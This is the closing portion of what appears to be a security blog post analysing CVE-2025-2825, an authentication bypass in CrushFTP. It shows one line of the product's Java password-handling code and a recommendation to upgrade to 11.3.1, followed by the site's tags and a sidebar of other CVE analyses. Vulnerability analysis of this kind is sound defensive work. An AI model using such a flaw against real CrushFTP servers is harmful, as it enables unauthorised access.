</span></span><span style="display:flex;"><span>               user_pass <span style="color:#f92672">=</span> com.<span style="color:#a6e22e">crushftp</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">encryptDecrypt</span>(tmp_user.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;password&#34;</span>), <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>            }
</span></span></code></pre></div><p>It is recommended to update the CrushFTP version to 11.3.1 as this vulnerability can be very severe if targeted cleverly.</p>

		</div>
		<footer class="post__footer">
			
<div class="post__tags tags clearfix">
	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
	<ul class="tags__list">
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/cve-2025-2825/" rel="tag">CVE-2025-2825</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/java/" rel="tag">Java</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/auth-bypass/" rel="tag">auth-bypass</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/logic-flaw/" rel="tag">logic-flaw</a>
		</li>
	</ul>
</div>
		</footer>
	</article>
</main>

<div class="authorbox clearfix">
	<p class="authorbox__warning">
		<strong>WARNING:</strong> Authorbox is activated, but [Author] parameters are not specified.
	</p>
</div>

<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/hpe-irs-cve-deep-dive/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Exploring Recent CVEs in HPE Insight Remote Support</p>
		</a>
	</div>
</nav>


			</div>
			<aside class="sidebar"><div class="widget-search widget">
	<form class="widget-search__form" role="search" method="get" action="https://google.com/search">
		<input class="widget-search__field" type="search" placeholder="Search…" value="" name="q" aria-label="Search…">
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://localhost:1313/">
	</form>
</div>
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/posts/crushftp-cve-2025-2825/">CVE 2025-2825 - CrushFTP Authentication Bypass Analysis</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/hpe-irs-cve-deep-dive/">Exploring Recent CVEs in HPE Insight Remote Support</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/ivanti-endpoint-manager-xxe-cve-2024-37397/">CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/crushftp-cve-2024-4040/">CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis</a></li>
		</ul>
	</div>
</div>
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item">
				<a class="widget__link" href="/categories/cve-analysis/">CVE Analysis</a></li>
		</ul>
	</div>
</div>
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget-taglist__link widget__link btn" href="/tags/java/" title="Java">Java (3)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/rce/" title="RCE">RCE (2)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/xxe/" title="XXE">XXE (2)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/.net/" title=".NET">.NET (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/auth-bypass/" title="Auth-Bypass">Auth-Bypass (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-37297/" title="CVE-2024-37297">CVE-2024-37297 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-4040/" title="Cve-2024-4040">Cve-2024-4040 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53675/" title="CVE-2024-53675">CVE-2024-53675 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53676/" title="CVE-2024-53676">CVE-2024-53676 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2025-2825/" title="CVE-2025-2825">CVE-2025-2825 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/logic-flaw/" title="Logic-Flaw">Logic-Flaw (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/oob-xxe/" title="OOB-XXE">OOB-XXE (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/path-traversal/" title="Path Traversal">Path Traversal (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/ssti/" title="SSTI">SSTI (1)</a>
	</div>
</div>

</aside>
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2025 .
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
	</div>
<script async defer src="/js/menu.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
</body>
</html>